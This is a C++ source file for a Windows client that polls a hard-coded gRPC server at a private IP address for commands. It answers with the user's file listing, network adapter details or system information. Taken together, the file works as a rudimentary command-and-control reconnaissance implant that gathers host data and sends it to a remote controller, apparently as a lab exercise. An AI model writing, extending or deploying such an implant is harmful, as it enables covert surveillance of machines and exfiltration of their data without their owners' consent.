#include <iostream>
#include <memory>
#include <string>
#include <filesystem>
#include <grpcpp/grpcpp.h>
#include "com.grpc.pb.h"
#include <Windows.h>
#include <iphlpapi.h>
#include <winsock2.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")

class CommandClient {
public:
    CommandClient(std::shared_ptr<grpc::Channel> channel) : stub_(com::ComService::NewStub(channel)) {}

    std::string GetCommand() {
        com::Empty Request;
        com::ComResponse Reply;
        grpc::ClientContext Context;

        grpc::Status Status = stub_->GetCommand(&Context, Request, &Reply);
        if (Status.ok()) {
            return Reply.com();
        }
        else {
            std::cout << "RPC Error: " << Status.error_message() << std::endl;
            return "RPC Error";
        }
    }

    void SendResponse(const std::string& resp) {
        com::Response request;
        request.set_resp(resp);
        com::Empty reply;
        grpc::ClientContext context;

        grpc::Status status = stub_->SendResponse(&context, request, &reply);
        if (!status.ok()) {
            std::cout << "RPC Error: "  << status.error_message() << std::endl;
        }
    }

private:
    std::unique_ptr<com::ComService::Stub> stub_;
};

std::string ReadFiles() {
    std::string namesFiles;
    std::string path = "C:/Users/Kirill";
    for (const auto& entry : std::filesystem::directory_iterator(path)) {
        namesFiles += entry.path().string().erase(0,15) + "\n";
    }
    return namesFiles;
}

std::string ReadNetwork() {
    std::string Info;
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG Len = sizeof(IP_ADAPTER_INFO);

    if (GetAdaptersInfo(pAdapterInfo, &Len) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(Len);
    }

    Info += "***********************\n";
    if (GetAdaptersInfo(pAdapterInfo, &Len) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            Info += "Adapter: " + std::string(pAdapter->AdapterName) + "\n";
            Info += "Descript: " + std::string(pAdapter->Description) + "\n";
            Info += "IP Address: " + std::string(pAdapter->IpAddressList.IpAddress.String) + "\n";
            Info += "IP Mask: " + std::string(pAdapter->IpAddressList.IpMask.String) + "\n";
            Info += "Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String) + "\n";
            Info += "***********************\n";
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    return Info;
}

std::string ReadSystemInfo() {
    SYSTEM_INFO info;
    GetSystemInfo(&info);
    std::string sysInfo;
    sysInfo += "OEM ID: " + std::to_string(info.dwOemId) + '\n';
    sysInfo += "Number of procces: " + std::to_string(info.dwNumberOfProcessors) + '\n';
    sysInfo += "Page size: " + std::to_string(info.dwPageSize) + '\n';
    sysInfo += "Proccesor: " + std::to_string(info.dwProcessorType) + '\n';
    sysInfo += "Proccesor mask: " + std::to_string(info.dwActiveProcessorMask) + '\n';
    return sysInfo;
}

int main(int argc, char** argv) {
    std::string target_str = "192.168.44.130:50051";
    CommandClient client(grpc::CreateChannel(target_str, grpc::InsecureChannelCredentials()));
    std::string command = client.GetCommand();
    std::cout << "Command: " << command << std::endl;

    std::string response;
    if (command == "Files") {
        response = ReadFiles();
    }
    else if (command == "Network") {
        response = ReadNetwork();
    }
    else if (command == "SystemInfo") {
        response = ReadSystemInfo();
    }
    else {
        response = "Unknown " + command;
    }

    client.SendResponse(response);
    return 0;
}

